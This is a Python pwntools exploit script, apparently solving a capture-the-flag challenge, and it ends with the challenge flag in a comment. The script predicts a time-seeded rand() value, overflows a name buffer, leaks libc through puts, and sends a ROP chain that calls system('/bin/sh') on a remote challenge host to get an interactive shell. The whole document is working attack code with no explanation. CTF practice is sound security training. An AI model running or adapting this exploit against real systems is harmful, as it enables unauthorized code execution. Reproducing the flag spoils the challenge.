from pwn import *
from ctypes import CDLL
from math import *
if __name__=='__main__':
  #io = process('./chall')
  io = remote('gc1.eng.run', 30097)
  exe = ELF('./chall')
  libc = CDLL('./libc.so.6')
  now = int(floor(time.time()))&0xffffff00
  print(hex(now))
  libc.srand(now)
  r = libc.rand()
  p = process('./win3')
  p.sendline(str(r))
  #p.close()
  res = int(p.recvline(),0)
  L_pop_rdi = 0x0000000000401813
  io.sendlineafter(b'name: \n',
    p64(0)*5+p64(res)+p64(3234516702)+\
    p64(4207869677)+\
    p64(0x0000000183b02d47)+\
    p64(0x41414141)+p64(0x41414141)+\
    p64(L_pop_rdi)+p64(exe.got['puts'])+\
    p64(exe.sym.puts)+p64(exe.sym.vuln)
  )
  libc_leak = u64(io.recvline().strip()+b'\0\0')
  libc_base = libc_leak - 0x875a0
  system = 0x55410
  bin_sh = 0x1b75aa
  print(hex(libc_base))

  i = process('./win3')
  i.sendline(str(libc.rand()))
  res = int(i.recvline(),0)

  io.sendlineafter(b'name: \n',
    p64(0)*5+p64(res)+p64(3234516702)+\
    p64(4207869677)+\
    p64(0x0000000183b02d47)+\
    p64(0x41414141)+p64(0x41414141)+\
    p64(L_pop_rdi)+p64(libc_base+bin_sh)+\
    p64(L_pop_rdi+1)+p64(libc_base+system)
  )
  #inctf{r0pp1ng_4nd_r3v3r51ng_4r3_my_h0bb135!!}
  io.interactive()